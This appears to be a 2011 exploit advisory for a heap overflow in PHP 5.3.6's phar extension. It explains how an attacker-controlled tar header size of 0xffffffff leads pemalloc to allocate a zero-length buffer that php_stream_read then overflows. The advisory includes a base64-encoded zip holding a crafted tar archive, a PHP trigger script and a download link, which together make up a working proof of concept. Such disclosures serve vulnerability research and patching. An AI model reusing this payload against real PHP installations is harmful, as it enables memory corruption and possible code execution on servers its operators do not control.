from: http://0x1byte.blogspot.com/2011/04/php-phar-extension-heap-overflow.html
version PHP:  5.3.6
version phar ext.: 1.1.1
site: http://php.net/
source code: http://windows.php.net/downloads/releases/php-5.3.6-src.zip

An integer overflow vulnerability leading to a heap overflow in the file ..\php-5.3.6\ext\phar\tar.c.


int phar_parse_tarfile(php_stream* fp, char *fname, int fname_len, char *alias, int alias_len, phar_archive_data** pphar, int is_data, php_uint32 compression, char **error TSRMLS_DC) /* {{{ */
{
//.....
size = entry.uncompressed_filesize = entry.compressed_filesize =
phar_tar_number(hdr->size, sizeof(hdr->size)); //(*)
//.....
if (!last_was_longlink && hdr->typeflag == 'L') {
last_was_longlink = 1;
/* support the ././@LongLink system for storing long filenames */
entry.filename_len = entry.uncompressed_filesize;
entry.filename = pemalloc(entry.filename_len+1, myphar->is_persistent); //(**)

read = php_stream_read(fp, entry.filename, entry.filename_len); //(***)
//.....

If entry.filename_len(which attacker can control) equal 0xffffffff, pemalloc() will allocate zero length buffer. Then php_stream_read() get as a length parameter 0xffffffff value. Because php_stream_read () checks that the passed length does not exceed the amount of data available, the buffer overflow sizes are available from the data stream.

POC code (MIME encoded):
php_phar.zip begin
 
UEsDBBQAAAAIAA96ez4k50+6aQAAAG0AAAAIAAAAcGhhci5waHAVi0sKgzAQ
QPeeYhoKTjbpAfpx1ULBhTcYghlxUJMhCnp8ze7xeO/V6KggA+CNj43jKinS
nHzggEZHn421EITRrJOosc+quhcNb4i8Q3chBsnRL4xEv3/7JbLgoH5o6l0p
3eZzXb7mcwJQSwMEFAAAAAgAMbB7PrO7HsFRAAAAmxAAAAwAAABwb2MucGhh
ci50YXLtzTsKgDAQRdFZiisQM9HJJtxEQEEbCX7A5RsrC2u18J7y8eCOU9fv
ZRqSPKfKzOy2h4s4V2ndmFevct590KKVF2zLGueclH+KAAAAAAB86wBQSwEC
FAAUAAAACAAPens+JOdPumkAAABtAAAACAAAAAAAAAAAACAAAAAAAAAAcGhh
ci5waHBQSwECFAAUAAAACAAxsHs+s7sewVEAAACbEAAADAAAAAAAAAAAACAA
AACPAAAAcG9jLnBoYXIudGFyUEsFBgAAAAACAAIAcAAAAAoBAAAAAA==
 
end

PHP POC:
<?php if (!extension_loaded("phar")) die("skip");

$phar = new Phar(dirname(__FILE__) . '/poc.phar.tar');

?>

http://www.exploit-db.com/sploits/poc.phar.tar